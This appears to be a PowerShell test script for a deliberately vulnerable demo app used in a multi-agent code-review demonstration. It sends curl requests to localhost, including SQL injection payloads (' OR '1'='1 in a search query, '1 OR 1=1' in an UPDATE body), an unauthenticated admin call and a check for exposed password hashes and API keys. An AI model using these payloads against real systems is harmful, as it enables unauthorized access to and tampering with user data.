# Test Vulnerabilities Script for Windows PowerShell
# This script tests all intentional vulnerabilities in the demo

Write-Host "`n=== Multi-Agent Code Review Demo - Vulnerability Tests ===" -ForegroundColor Cyan
Write-Host "Make sure the server is running (npm start) before running these tests`n" -ForegroundColor Yellow

# Test 1: SQL Injection
Write-Host "[1/4] Testing SQL Injection Vulnerability..." -ForegroundColor Magenta
Write-Host "Expected: Returns ALL users (bypassing username filter)`n" -ForegroundColor Gray
curl.exe "http://localhost:3000/api/users/search?username=%27%20OR%20%271%27=%271"
Write-Host "`n✓ If you see multiple users with password_hash fields, SQL injection works!`n" -ForegroundColor Green

# Test 2: Missing Authentication
Write-Host "[2/4] Testing Missing Authentication..." -ForegroundColor Magenta
Write-Host "Expected: Admin endpoint accessible without Bearer token`n" -ForegroundColor Gray
curl.exe "http://localhost:3000/api/users/admin/getAllUsers"
Write-Host "`n✓ If you see users without providing auth header, vulnerability confirmed!`n" -ForegroundColor Green

# Test 3: Data Exposure
Write-Host "[3/4] Testing Sensitive Data Exposure..." -ForegroundColor Magenta
Write-Host "Expected: Response includes password_hash and api_key fields`n" -ForegroundColor Gray
curl.exe "http://localhost:3000/api/users/list"
Write-Host "`n✓ If you see password_hash and api_key in the response, data exposure confirmed!`n" -ForegroundColor Green

# Test 4: SQL Injection in UPDATE
Write-Host "[4/4] Testing SQL Injection in UPDATE endpoint..." -ForegroundColor Magenta
Write-Host "Expected: Updates multiple users (not just one)`n" -ForegroundColor Gray
$body = '{"userId": "1 OR 1=1", "email": "pwned@hack.com"}'
curl.exe -X POST "http://localhost:3000/api/users/update" `
  -H "Content-Type: application/json" `
  -d $body
Write-Host "`n✓ If changed count > 1, SQL injection in UPDATE confirmed!`n" -ForegroundColor Green

Write-Host "=== All Vulnerability Tests Complete ===" -ForegroundColor Cyan
Write-Host "`nThese vulnerabilities are INTENTIONAL for demo purposes." -ForegroundColor Yellow
Write-Host "See src/middleware/auth.js for proper implementations.`n" -ForegroundColor Yellow
